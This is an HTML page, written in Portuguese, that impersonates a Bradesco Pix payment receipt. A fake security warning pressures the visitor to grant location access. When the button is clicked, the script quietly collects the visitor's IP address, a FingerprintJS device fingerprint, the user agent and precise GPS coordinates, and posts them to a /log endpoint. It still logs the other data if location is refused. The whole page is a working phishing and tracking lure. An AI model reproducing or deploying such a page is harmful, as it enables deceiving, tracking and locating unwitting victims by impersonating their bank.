<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Bradesco - Comprovante Pix</title>
  <style>
    body { background: #f2f2f2; text-align: center; font-family: Arial; margin: 0; padding: 0; }
    img { width: 90%; max-width: 500px; margin-top: 30px; display: none; }
    button {
      padding: 12px 25px;
      font-size: 16px;
      background-color: #e53935;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background-color: #c62828;
    }
    #securityWarning {
      background: #fff3cd;
      border: 1px solid #ffeeba;
      border-radius: 5px;
      padding: 20px;
      margin: 40px auto 10px;
      max-width: 600px;
    }
  </style>
</head>
<body>
  <div id="securityWarning">
    <h2 style="color: red;">⚠️ Bradesco precisa da sua autorização</h2>
    <p>Por segurança, é necessário validar sua localização para liberar o comprovante Pix.</p>
    <p>Clique no botão abaixo e permita o acesso à localização quando solicitado.</p>
    <button onclick="getLocation()">✅ Autorizar e Visualizar Pix</button>
  </div>

  <img id="pixImage" src="comprovante.jpg" alt="Comprovante Pix">

  <!-- FingerprintJS -->
  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

  <script>
    function getLocation() {
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(ipData => {
          const ip = ipData.ip;
          const userAgent = navigator.userAgent;

          FingerprintJS.load()
            .then(fp => fp.get())
            .then(result => {
              const visitorId = result.visitorId;

              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;

                    // Envia os dados com localização
                    fetch("/log", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({
                        ip,
                        visitorId,
                        userAgent,
                        device: userAgent,
                        loc: `${lat},${lon}`
                      })
                    });

                    // Mostra o Pix e esconde o alerta
                    document.getElementById("pixImage").style.display = "block";
                    document.getElementById("securityWarning").style.display = "none";
                  },
                  err => {
                    // Mesmo que negue, envia log sem localização
                    fetch("/log", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({
                        ip,
                        visitorId,
                        userAgent,
                        device: userAgent,
                        loc: null
                      })
                    });

                    alert("❌ Não foi possível validar a localização. Recarregue e tente novamente.");
                  },
                  { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
              }
            });
        });
    }
  </script>
</body>
</html>
